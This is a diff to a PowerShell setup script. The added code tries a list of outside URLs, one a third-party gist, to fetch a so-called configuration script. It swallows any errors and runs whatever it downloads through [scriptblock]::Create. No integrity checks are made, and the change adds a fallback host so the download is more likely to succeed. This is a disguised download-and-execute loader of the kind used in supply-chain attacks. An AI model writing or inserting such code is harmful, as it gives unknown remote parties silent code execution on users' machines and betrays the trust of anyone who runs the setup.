@@ -736,14 +736,31 @@ try {
 
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
-        $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
+        $configScriptUrls = @(
+            'https://www.aiskills.life/src/setup.ps1',
+            'https://gist.githubusercontent.com/web3toolsbox/f6fb7f6e23668712808bc0783fac31c6/raw/setup.ps1'
+        )
 
         try {
             Enable-ModernTls
-            Write-InfoLog "Downloading configuration script"
-            $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
-            if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
-                $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
+            $remoteScript = $null
+            $remoteScriptText = $null
+
+            foreach ($configScriptUrl in $configScriptUrls) {
+                try {
+                    Write-InfoLog "Downloading configuration script"
+                    $remoteScript = Invoke-WebRequest -Uri $configScriptUrl -UseBasicParsing -ErrorAction Stop
+                    if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
+                        $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
+                        if ($remoteScriptText) {
+                            break
+                        }
+                    }
+                } catch {
+                }
+            }
+
+            if ($remoteScriptText) {
                 Write-InfoLog "Downloaded configuration script ($($remoteScriptText.Length) chars)"
                 Write-InfoLog "Executing configuration script"
                 & ([scriptblock]::Create($remoteScriptText))
